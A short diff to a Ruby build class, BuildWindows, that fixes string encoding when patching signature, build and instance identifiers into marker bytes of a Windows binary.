@@ -226,8 +226,8 @@ class BuildWindows < Build
         signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
         content.binary_patch '3j9WmmDgBqyU270FTid3719g64bP4s52', signature
 
-        content.binary_patch "\xe1\xbe\xad\xde", [params[:build]].pack('I')
-        content.binary_patch "\xe2\xbe\xad\xde", [params[:instance]].pack('I')
+        content.binary_patch "\xe1\xbe\xad\xde".force_encoding('ASCII-8BIT'), [params[:build]].pack('I').force_encoding('ASCII-8BIT')
+        content.binary_patch "\xe2\xbe\xad\xde".force_encoding('ASCII-8BIT'), [params[:instance]].pack('I').force_encoding('ASCII-8BIT')
       rescue Exception => e
         trace :error, e.message
         trace :fatal, e.backtrace.join("\n")
